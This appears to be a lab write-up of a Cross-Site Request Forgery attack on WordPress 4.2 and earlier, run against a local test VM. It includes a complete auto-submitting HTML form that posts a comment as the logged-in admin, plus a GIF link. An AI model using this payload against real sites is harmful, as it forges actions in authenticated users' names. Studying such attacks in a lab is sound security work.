 Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. CSRF attacks are possible when the application does not ensure that a user is in fact interacting with it.

Steps:

1)Make a comment 

2) Then inspect the code to be able to create a malicious form 

3)Create a malicious form code:

    <html>
        <head></head>
        <body>
            <form name="csrfForm" action="http://wpdistillery.vm/wp-comments-post.php" method="POST">
                <input type="hidden" name="comment" value="I made a new comment">
                <input type="hidden" name="comment_post_ID" value="1">
                <input type="hidden" name="comment_parent" value="0">
                <input type="hidden" name="_wp_unfiltered_html_comment" value="456890231">
                <input type="submit" value="Post+Comment">
            </form>
            <script>document.csrfForm.submit(); </script>
    </body>
    </html>
    
4)With that code set up a malicious website

5)The malicious website will automatically submit ad post the comment 'I made a new comment' as an admin.

Tested in version: WordPress <= 4.2

GIF Walkthrough:

![CSRF](https://user-images.githubusercontent.com/78192383/162076560-c9452ca4-848f-4010-9c10-ce8a0b0c7de4.gif)
